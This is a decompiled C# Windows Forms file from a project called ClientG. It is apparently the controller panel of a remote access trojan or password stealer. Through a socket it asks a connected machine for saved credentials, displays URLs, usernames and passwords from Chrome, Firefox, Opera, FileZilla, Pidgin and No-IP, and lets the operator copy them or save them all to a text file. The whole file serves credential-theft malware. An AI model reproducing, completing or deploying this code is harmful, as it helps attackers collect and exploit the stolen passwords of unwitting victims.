using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ClientG;

[DesignerGenerated]
public class PasswordsGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("ContextMenuStrip1")]
	private ContextMenuStrip _ContextMenuStrip1;

	[AccessedThroughProperty("OpenUrlToolStripMenuItem")]
	private ToolStripMenuItem _OpenUrlToolStripMenuItem;

	[AccessedThroughProperty("CopyPassToolStripMenuItem")]
	private ToolStripMenuItem _CopyPassToolStripMenuItem;

	[AccessedThroughProperty("CopyPassToolStripMenuItem1")]
	private ToolStripMenuItem _CopyPassToolStripMenuItem1;

	[AccessedThroughProperty("SaveALLToolStripMenuItem")]
	private ToolStripMenuItem _SaveALLToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	public int CountGroupFileZilla;

	public int CountGroupFireFox;

	public int CountGroupNO_IP;

	public int CountGroupPidgin;

	public int CountGroupsChrome;

	public int CountGroupsOpera;

	public string Path;

	public int Sock;

	public string T;

	public string TH;

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem OpenUrlToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenUrlToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenUrlToolStripMenuItem_Click;
			if (_OpenUrlToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenUrlToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenUrlToolStripMenuItem = value;
			if (_OpenUrlToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenUrlToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem CopyPassToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _CopyPassToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CopyPassToolStripMenuItem_Click;
			if (_CopyPassToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyPassToolStripMenuItem).remove_Click(eventHandler);
			}
			_CopyPassToolStripMenuItem = value;
			if (_CopyPassToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyPassToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem CopyPassToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CopyPassToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CopyPassToolStripMenuItem1_Click;
			if (_CopyPassToolStripMenuItem1 != null)
			{
				((ToolStripItem)_CopyPassToolStripMenuItem1).remove_Click(eventHandler);
			}
			_CopyPassToolStripMenuItem1 = value;
			if (_CopyPassToolStripMenuItem1 != null)
			{
				((ToolStripItem)_CopyPassToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem SaveALLToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SaveALLToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SaveALLToolStripMenuItem_Click;
			if (_SaveALLToolStripMenuItem != null)
			{
				((ToolStripItem)_SaveALLToolStripMenuItem).remove_Click(eventHandler);
			}
			_SaveALLToolStripMenuItem = value;
			if (_SaveALLToolStripMenuItem != null)
			{
				((ToolStripItem)_SaveALLToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem_Click;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem = value;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public PasswordsGR()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Passwords_FormClosing));
		((Form)this).add_Load((EventHandler)Passwords_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Expected O, but got Unknown
		//IL_04c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ce: Expected O, but got Unknown
		//IL_0656: Unknown result type (might be due to invalid IL or missing references)
		//IL_0660: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PasswordsGR));
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		ListView1 = new ListView();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader3 = new ColumnHeader();
		ContextMenuStrip1 = new ContextMenuStrip(components);
		OpenUrlToolStripMenuItem = new ToolStripMenuItem();
		CopyPassToolStripMenuItem = new ToolStripMenuItem();
		CopyPassToolStripMenuItem1 = new ToolStripMenuItem();
		SaveALLToolStripMenuItem = new ToolStripMenuItem();
		ImageList1 = new ImageList(components);
		RefreshToolStripMenuItem = new ToolStripMenuItem();
		((Control)StatusStrip1).SuspendLayout();
		((Control)ContextMenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ToolStripStatusLabel1,
			(ToolStripItem)ToolStripStatusLabel2
		});
		StatusStrip statusStrip = StatusStrip1;
		Point location = new Point(0, 364);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		Size size = new Size(852, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(0);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel2;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		ListView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { ColumnHeader1, ColumnHeader2, ColumnHeader3 });
		((Control)ListView1).set_ContextMenuStrip(ContextMenuStrip1);
		((Control)ListView1).set_Dock((DockStyle)5);
		((Control)ListView1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView1.set_FullRowSelect(true);
		ListView listView = ListView1;
		location = new Point(0, 0);
		((Control)listView).set_Location(location);
		ListView1.set_MultiSelect(false);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(852, 364);
		((Control)listView2).set_Size(size);
		ListView1.set_SmallImageList(ImageList1);
		((Control)ListView1).set_TabIndex(1);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		ListView1.set_View((View)1);
		ColumnHeader1.set_Text("URL");
		ColumnHeader1.set_Width(371);
		ColumnHeader2.set_Text("USER");
		ColumnHeader2.set_Width(234);
		ColumnHeader3.set_Text("PASS");
		ColumnHeader3.set_Width(238);
		((ToolStrip)ContextMenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)OpenUrlToolStripMenuItem,
			(ToolStripItem)CopyPassToolStripMenuItem,
			(ToolStripItem)CopyPassToolStripMenuItem1,
			(ToolStripItem)SaveALLToolStripMenuItem,
			(ToolStripItem)RefreshToolStripMenuItem
		});
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip1;
		size = new Size(129, 114);
		((Control)contextMenuStrip).set_Size(size);
		((ToolStripItem)OpenUrlToolStripMenuItem).set_Image((Image)(object)Resources._1484142543_web);
		((ToolStripItem)OpenUrlToolStripMenuItem).set_Name("OpenUrlToolStripMenuItem");
		ToolStripMenuItem openUrlToolStripMenuItem = OpenUrlToolStripMenuItem;
		size = new Size(128, 22);
		((ToolStripItem)openUrlToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenUrlToolStripMenuItem).set_Text("Open URL");
		((ToolStripItem)CopyPassToolStripMenuItem).set_Image((Image)(object)Resources._1484142564_user_male);
		((ToolStripItem)CopyPassToolStripMenuItem).set_Name("CopyPassToolStripMenuItem");
		ToolStripMenuItem copyPassToolStripMenuItem = CopyPassToolStripMenuItem;
		size = new Size(128, 22);
		((ToolStripItem)copyPassToolStripMenuItem).set_Size(size);
		((ToolStripItem)CopyPassToolStripMenuItem).set_Text("Copy User");
		((ToolStripItem)CopyPassToolStripMenuItem1).set_Image((Image)(object)Resources._1484142946_Safety01);
		((ToolStripItem)CopyPassToolStripMenuItem1).set_Name("CopyPassToolStripMenuItem1");
		ToolStripMenuItem copyPassToolStripMenuItem2 = CopyPassToolStripMenuItem1;
		size = new Size(128, 22);
		((ToolStripItem)copyPassToolStripMenuItem2).set_Size(size);
		((ToolStripItem)CopyPassToolStripMenuItem1).set_Text("Copy Pass");
		((ToolStripItem)SaveALLToolStripMenuItem).set_Image((Image)(object)Resources._1484142663_editor_floopy_dish_save_glyph);
		((ToolStripItem)SaveALLToolStripMenuItem).set_Name("SaveALLToolStripMenuItem");
		ToolStripMenuItem saveALLToolStripMenuItem = SaveALLToolStripMenuItem;
		size = new Size(128, 22);
		((ToolStripItem)saveALLToolStripMenuItem).set_Size(size);
		((ToolStripItem)SaveALLToolStripMenuItem).set_Text("Save All");
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "1484142257_Pidgin.png");
		ImageList1.get_Images().SetKeyName(1, "noip.jpg");
		ImageList1.get_Images().SetKeyName(2, "1484142282_FileZilla.png");
		ImageList1.get_Images().SetKeyName(3, "1484142186_Opera.png");
		ImageList1.get_Images().SetKeyName(4, "1484142130_google-chrome.png");
		ImageList1.get_Images().SetKeyName(5, "1484142091_firefox_png.png");
		ImageList1.get_Images().SetKeyName(6, "1487359699_link5.png");
		ImageList1.get_Images().SetKeyName(7, "1487359635_user_male.png");
		ImageList1.get_Images().SetKeyName(8, "1487359667_Safety01.png");
		((ToolStripItem)RefreshToolStripMenuItem).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		((ToolStripItem)RefreshToolStripMenuItem).set_Name("RefreshToolStripMenuItem");
		ToolStripMenuItem refreshToolStripMenuItem = RefreshToolStripMenuItem;
		size = new Size(152, 22);
		((ToolStripItem)refreshToolStripMenuItem).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Text("Refresh");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(852, 386);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)StatusStrip1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Passwords");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Passwords");
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)ContextMenuStrip1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Passwords_Load(object sender, EventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(Sock, "Get" + MyProject.Forms.FrmMAINGR.Key);
		try
		{
			ColumnHeader1.set_ImageIndex(6);
			ColumnHeader2.set_ImageIndex(7);
			ColumnHeader3.set_ImageIndex(8);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CopyPassToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (ListView1.get_FocusedItem().get_SubItems().get_Item(2)
				.get_Text()
				.Length > 0)
			{
				((Computer)MyProject.Computer).get_Clipboard().SetText(ListView1.get_FocusedItem().get_SubItems().get_Item(2)
					.get_Text());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CopyPassToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (ListView1.get_FocusedItem().get_SubItems().get_Item(1)
				.get_Text()
				.Length > 0)
			{
				((Computer)MyProject.Computer).get_Clipboard().SetText(ListView1.get_FocusedItem().get_SubItems().get_Item(1)
					.get_Text());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (ListView1.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.Length > 0)
			{
				Process.Start(ListView1.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Passwords_FormClosing(object sender, FormClosingEventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(Sock, "Abort");
	}

	private void SaveALLToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		if (ListView1.get_Items().get_Count() <= 0)
		{
			return;
		}
		SaveFileDialog val = new SaveFileDialog();
		((FileDialog)val).set_Filter("Passwords|*.txt");
		((FileDialog)val).set_FileName("Passwords");
		if ((int)((CommonDialog)val).ShowDialog() != 1)
		{
			return;
		}
		try
		{
			string text = string.Empty;
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ListView1.get_SelectedItems().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem val2 = (ListViewItem)enumerator.Current;
						text = text + "URL : " + val2.get_SubItems().get_Item(0).get_Text() + "\r\nUser : " + val2.get_SubItems().get_Item(1).get_Text() + "\r\nPassword : " + val2.get_SubItems().get_Item(2).get_Text() + "\r\n";
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			File.WriteAllText(((FileDialog)val).get_FileName(), text);
			MessageBox.Show("Passwords have been Saved successfully at: " + ((FileDialog)val).get_FileName() + "!", "Successfully!", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			((ToolStripItem)ToolStripStatusLabel1).set_Text("");
			((ToolStripItem)ToolStripStatusLabel2).set_Text("");
			ListView1.get_Items().Clear();
			MyProject.Forms.FrmMAINGR.s.Send(Sock, "Get" + MyProject.Forms.FrmMAINGR.Key);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
